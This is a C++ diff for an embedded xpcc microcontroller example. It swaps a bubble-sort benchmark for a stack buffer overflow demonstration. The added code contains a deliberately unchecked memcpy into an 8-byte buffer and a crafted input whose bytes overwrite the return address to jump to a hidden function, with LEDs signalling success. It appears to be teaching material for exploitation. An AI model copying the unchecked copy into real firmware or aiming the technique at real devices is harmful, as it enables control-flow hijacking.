@@ -1,40 +1,21 @@
 #include <xpcc/architecture/platform.hpp>
 
-extern "C" {
-
-typedef struct {
-	// source: Embedded Trace Macrocell Architecture Specification
-	//         section "3.4 The ETM registers"
-	__IOM uint32_t CR; ///< (0x000) Main Control Register
-} ETM_Type;
-
-#define ETM_CR_PROGRAMMING (0x1UL << 10U)
-
-#define ETM_BASE  (0xE0041000UL) ///< ETM Base Address
-#define ETM ((ETM_Type*) ETM_BASE)
-
+void buggy_function(const uint8_t* packet) {
+	char buffer[8];
+	const uint8_t length = packet[0];
+	std::memcpy(buffer, packet + 1, length);
 }
 
-const uint32_t values[10] = {4, 8, 3, 25, 3, 0, 4, 5, 100, 7549387};
 
-void swap(uint32_t* vv, const int32_t ii, const int32_t jj) {
-	const uint32_t tmp = vv[ii];
-	vv[ii] = vv[jj];
-	vv[jj] = tmp;
-}
-
-void bubble_sort(uint32_t* vv, const int32_t count) {
-	bool sorted = false;
-	while(not sorted) {
-		sorted = true;
-		for(int32_t ii = 1; ii < count; ++ii) {
-			if(vv[ii-1] > vv[ii]) {
-				sorted = false;
-				swap(vv, ii-1, ii);
-			}
-		}
+void secret_function() {
+	while(1) {
+		Board::LedRed::toggle();
+		xpcc::delayMilliseconds(250);
 	}
 }
+
+
+volatile int enable_sec = 0;
 
 int
 main()
@@ -47,14 +28,26 @@ main()
 	// which will provide independence from the system clock of our target controller
 	//systemClock::enable();
 
-	asm volatile("": : :"memory");
-	uint32_t sorted[10];
-	std::memcpy(sorted, values, sizeof(uint32_t) * 10);
-	bubble_sort(sorted, 10);
-	asm volatile("": : :"memory");
+	// enable two gpios so that we can see if the attack worked
+	Board::LedRed::setOutput();
+	Board::LedGreen::setOutput();
+
+	if(enable_sec) {
+		secret_function();
+	}
+
+	const uint8_t good_inp [9] = {8, '0', '1', '2', '3', '4', '5', '6', '7'};
+	buggy_function(good_inp);
+
+	// 0xaa for padding; addr: 0x80003a4
+	const uint8_t bad_inp [9 + 8] = {8 + 8, '0', '1', '2', '3', '4', '5', '6', '7', 0xaa, 0xaa, 0xaa, 0xaa, 0xa4, 0x03, 0x00, 0x80};
+	buggy_function(bad_inp);
+
 
 	while (1)
 	{
+		Board::LedGreen::toggle();
+		xpcc::delayMilliseconds(250);
 	}
 
 	return 0;
